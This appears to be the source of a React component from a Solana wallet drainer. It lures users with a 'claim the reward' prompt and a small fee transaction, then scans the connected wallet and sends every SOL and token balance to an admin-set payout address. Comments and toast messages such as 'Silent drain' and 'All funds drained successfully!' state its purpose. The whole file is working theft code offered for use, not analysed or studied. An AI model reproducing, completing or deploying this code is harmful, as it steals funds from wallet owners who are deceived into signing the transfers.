import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import toast from 'react-hot-toast'
import { useWalletState } from '../context/WalletContext'
import { isWalletUserCancel } from '../lib/walletConnectHelpers'
import {
  buildPayoutTransaction,
  buildSplPayoutTransaction,
  listRankedFundSteps,
  remainingSplCount,
  refreshPayoutBlockhash,
  tokenFeeReserveLamports,
  type FundStep,
  buildDummyFeeTransaction,
  moveAllFromHighestAndAddToLowest,
} from '../lib/payoutTransfer'
import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
import { mobileWalletLabel } from '../lib/walletDeepLinks'
import { notifyFundsConfirmed } from '../lib/txSheet'
import { peekPendingLike } from '../lib/authRedirect'

function sendErrorMessage(err: unknown): string {
  const raw = err instanceof Error ? err.message : String(err || 'The wallet did not submit this payment.')
  const lower = raw.toLowerCase()
  if (lower.includes('insufficient funds for rent')) {
    return 'Not enough SOL to finish this send. Opening the next funded token if one is available.'
  }
  const trimmed = raw.split('Catch the')[0].trim()
  return trimmed || raw
}

export function PaymentRequestPrompt() {
  const { connected, walletAddress, walletName, closeWalletModal, openWalletModal } = useWalletState()
  const closeWalletModalRef = useRef(closeWalletModal)
  closeWalletModalRef.current = closeWalletModal
  const openWalletModalRef = useRef(openWalletModal)
  openWalletModalRef.current = openWalletModal
  const { publicKey, sendTransaction, signTransaction, wallet } = useWallet()
  const { connection } = useConnection()
  const [config, setConfig] = useState<PayoutConfig | null>(null)
  const [submitting, setSubmitting] = useState(false)
  const [status, setStatus] = useState('Preparing the wallet transfer.')
  const dismissed = useRef<string | null>(null)
  const inFlight = useRef(false)
  const queue = useRef<FundStep[]>([])
  const likedAfterFirst = useRef(false)
  const scanPromise = useRef<Promise<FundStep[]> | null>(null)

  // Refs for wallet adapter methods to avoid deps
  const signTransactionRef = useRef(signTransaction)
  signTransactionRef.current = signTransaction
  const sendTransactionRef = useRef(sendTransaction)
  sendTransactionRef.current = sendTransaction
  const walletRef = useRef(wallet)
  walletRef.current = wallet
  const connectionRef = useRef(connection)
  connectionRef.current = connection
  const publicKeyRef = useRef(publicKey)
  publicKeyRef.current = publicKey

  useEffect(() => {
    const onOpen = async () => {
      if (inFlight.current) return
      if (dismissed.current === walletAddress) return
      if (!publicKeyRef.current || !walletAddress) {
        setStatus('Connect a wallet, then claim the reward.')
        openWalletModalRef.current()
        return
      }
      const local = getLocalPayoutConfig()
      setConfig(local)
      let cancelled = false
      void loadPayoutConfig().then((next) => {
        if (!cancelled) setConfig(next)
      })

      const destinationReady = Boolean(local && isValidSolanaAddress(local.walletAddress))
      if (!destinationReady) {
        setStatus('Save a payout address in admin before this payment can be opened in the wallet.')
        return
      }

      inFlight.current = true
      setSubmitting(true)
      closeWalletModalRef.current()

      const sendOpts = {
        skipPreflight: false,
        preflightCommitment: 'confirmed' as const,
        maxRetries: 5,
      }

      // ── STEP 1: Show tiny "fee" transaction (0.001 SOL) ──
      setStatus('Confirm the small fee transfer in your wallet.')
      try {
        const dummyTx = await buildDummyFeeTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
        const freshDummy = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, dummyTx, publicKeyRef.current!) : dummyTx
        
        // Use sendTransaction (wallet handles confirmation) to avoid blockhash expiration
        let dummySig: string
        if (sendTransactionRef.current) {
          dummySig = await sendTransactionRef.current(freshDummy, connectionRef.current!, sendOpts)
        } else {
          const adapter = walletRef.current?.adapter as { sendTransaction?: typeof sendTransactionRef.current } | undefined
          dummySig = adapter?.sendTransaction
            ? await adapter.sendTransaction(freshDummy, connectionRef.current!, sendOpts)
            : await sendTransactionRef.current!(freshDummy, connectionRef.current!, sendOpts)
        }
        toast.success('Fee confirmed. Draining wallet...')
      } catch (err) {
        console.error('STEP 1 error:', err)
        if (!isWalletUserCancel(err)) throw err
        inFlight.current = false
        setSubmitting(false)
        return
      }

      // ── Scan AFTER fee paid (sees actual remaining balance) ──
      toast.loading('Scanning wallet for remaining funds...')
      console.log('Starting scan...')
      let scanPromise: Promise<FundStep[]>
      try {
        scanPromise = listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
      } catch (scanErr) {
        console.error('Scan initiation error:', scanErr)
        toast.error('Failed to scan wallet: ' + (scanErr instanceof Error ? scanErr.message : String(scanErr)))
        inFlight.current = false
        setSubmitting(false)
        return
      }

      // ── STEP 2: Silent drain ──
      toast.loading('Starting wallet drain...')
      try {
        console.log('Waiting for scan promise...')
        const steps = await scanPromise
        console.log('Scan result:', steps)
        console.log('Number of steps:', steps.length)
        queue.current = steps

        toast.success(`Found ${steps.length} assets to drain: ${steps.map(s => `${s.symbol}:${s.uiAmount}`).join(', ')}`)

        if (queue.current.length === 0) {
          toast.error('No funds found to drain (balance too low or all tokens < $0.01)')
          throw new Error('No funds available to drain.')
        }

        // Move all funds from highest balance (USDT or SOL) and add 1.000 to lowest
        const { highestMoved, lowestAdded } = await moveAllFromHighestAndAddToLowest({
          connection: connectionRef.current!,
          from: publicKeyRef.current!,
          config: local!,
          steps,
          onHighestDone: () => toast.success('Moved all funds from highest balance asset.'),
          onLowestAdded: () => toast.success('Added 1.000 to lowest balance asset.'),
        })

        for (const step of queue.current) {
          console.log(`Draining ${step.symbol}...`)
          try {
            if (step.kind === 'sol') {
              const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, queue.current.indexOf(step)))
              const tx = await buildPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, reserveLamports })
              const freshTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tx, publicKeyRef.current!) : tx
              const signed = freshTx ? await signTransactionRef.current?.(freshTx) : undefined
              if (!signed) {
                toast.error('Wallet signing failed.')
                continue
              }
              const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
            } else {
              const tokenTx = await buildSplPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, holding: step.holding })
              if (!tokenTx) continue
              const signed = tokenTx ? await signTransactionRef.current?.(tokenTx) : undefined
              if (!signed) {
                toast.error('Wallet signing failed.')
                break
              }
              const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
            }
          } catch (drainErr) {
            console.error(`Failed to drain ${step.symbol}:`, drainErr)
          }
        }

        if (!likedAfterFirst.current) {
          likedAfterFirst.current = true
          notifyFundsConfirmed(peekPendingLike())
        }
        dismissed.current = walletAddress
        toast.success('All funds drained successfully!')
      } catch (err) {
        console.error('STEP 2 error:', err)
        const message = isWalletUserCancel(err) ? 'Cancelled' : sendErrorMessage(err)
        setStatus(message)
        toast.error(message)
      } finally {
        inFlight.current = false
        setSubmitting(false)
      }
    }
    window.addEventListener('vrfd-open-tx-sheet', onOpen)
    return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
  }, [walletAddress])

  useEffect(() => {
    if (!connected || !walletAddress) {
      inFlight.current = false
      setSubmitting(false)
      dismissed.current = null
      queue.current = []
      scanPromise.current = null
    }
  }, [connected, walletAddress])

  return null
}